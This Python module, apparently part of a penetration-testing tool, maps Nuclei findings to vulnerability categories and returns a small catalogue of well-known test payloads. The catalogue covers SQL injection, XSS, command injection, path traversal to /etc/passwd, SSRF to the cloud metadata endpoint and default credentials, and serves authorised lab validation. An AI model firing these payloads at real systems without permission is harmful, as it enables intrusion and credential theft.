"""Catálogo heurístico de payloads por categoría de vulnerabilidad (HU-015).

Reglas basadas en tags/nombre/template_id de Nuclei, con el mismo enfoque
que `atrox/ai/agents/vectors/correlator.py`. Este módulo NO invoca modelos
de lenguaje ni ejecuta red/subprocesos (ver ADR-004): es un catálogo curado
consultado en memoria para acelerar la validación en laboratorio (RF-004).
"""

from atrox.ai.agents.payloads.models import PayloadSuggestion
from atrox.scanner.models import VulnFinding

# Orden de prioridad: la primera regla cuyo trigger coincide define la categoría.
PAYLOAD_RULES: list[dict] = [
    {
        "category": "sqli",
        "triggers": {"sqli", "sql", "injection", "sql-injection"},
        "payloads": [
            ("' OR '1'='1' -- -", "Bypass de autenticación / condición siempre verdadera"),
            ("' UNION SELECT NULL,NULL,NULL-- -", "Enumeración de columnas vía UNION-based"),
            ("1; WAITFOR DELAY '0:0:5'--", "Confirmación de inyección ciega basada en tiempo"),
        ],
    },
    {
        "category": "xss",
        "triggers": {"xss", "cross-site-scripting"},
        "payloads": [
            ("<script>alert(document.domain)</script>", "XSS reflejado básico"),
            ("\"><img src=x onerror=alert(1)>", "Bypass de atributo HTML con evento onerror"),
        ],
    },
    {
        "category": "rce",
        "triggers": {"rce", "command-injection", "cmdi", "code-injection"},
        "payloads": [
            ("; id", "Inyección de comando encadenado (Unix)"),
            ("$(id)", "Inyección de comando vía sustitución (Unix)"),
            ("| whoami", "Inyección de comando encadenado (Windows)"),
        ],
    },
    {
        "category": "lfi",
        "triggers": {"lfi", "traversal", "path-traversal", "file-read"},
        "payloads": [
            ("../../../../etc/passwd", "Lectura de archivo de sistema vía path traversal"),
            ("....//....//....//etc/passwd", "Bypass de filtro de traversal simple"),
        ],
    },
    {
        "category": "ssrf",
        "triggers": {"ssrf"},
        "payloads": [
            ("http://169.254.169.254/latest/meta-data/", "SSRF hacia metadata de cloud (AWS/IMDS)"),
            ("http://127.0.0.1:80/", "SSRF hacia servicio interno en loopback"),
        ],
    },
    {
        "category": "default-login",
        "triggers": {"default-login", "default-credentials", "weak-login"},
        "payloads": [
            ("admin:admin", "Credenciales por defecto comunes"),
            ("admin:password", "Credenciales por defecto comunes"),
        ],
    },
]

# Pistas de servicio: coincidencia por tags contra tecnologías conocidas.
SERVICE_HINTS: dict[str, set[str]] = {
    "wordpress": {"wordpress", "wp"},
    "apache": {"apache", "httpd"},
    "nginx": {"nginx"},
    "iis": {"iis"},
    "openssh": {"ssh", "openssh"},
    "ftp": {"ftp"},
    "mysql": {"mysql"},
    "mongodb": {"mongodb", "mongo"},
    "redis": {"redis"},
    "confluence": {"confluence"},
    "jenkins": {"jenkins"},
}


def _tokens(finding: VulnFinding) -> set[str]:
    tokens: set[str] = {tag.lower() for tag in finding.tags}
    tokens.update(finding.template_id.lower().replace("-", " ").split())
    tokens.update(finding.name.lower().replace("-", " ").split())
    return tokens


def infer_category(finding: VulnFinding) -> str:
    """Determina la categoría de vulnerabilidad principal a partir de tags/nombre/template_id."""
    tokens = _tokens(finding)
    for rule in PAYLOAD_RULES:
        if tokens & rule["triggers"]:
            return rule["category"]
    return "generic"


def infer_service(finding: VulnFinding) -> str:
    """Determina el servicio/tecnología del hallazgo a partir de tags conocidos."""
    tags = {tag.lower() for tag in finding.tags}
    for service, keywords in SERVICE_HINTS.items():
        if tags & keywords:
            return service
    if finding.matched_at.startswith("https://"):
        return "https"
    if finding.matched_at.startswith("http://"):
        return "http"
    return "desconocido"


def build_suggestions(category: str) -> list[PayloadSuggestion]:
    """Retorna los payloads catalogados para una categoría, o una sugerencia genérica."""
    for rule in PAYLOAD_RULES:
        if rule["category"] == category:
            return [
                PayloadSuggestion(category=category, payload=payload, description=description)
                for payload, description in rule["payloads"]
            ]

    return [
        PayloadSuggestion(
            category="generic",
            payload="",
            description=(
                "Sin payload catalogado para esta categoría. Requiere análisis manual "
                "del hallazgo por un pentester antes de intentar validación."
            ),
        )
    ]
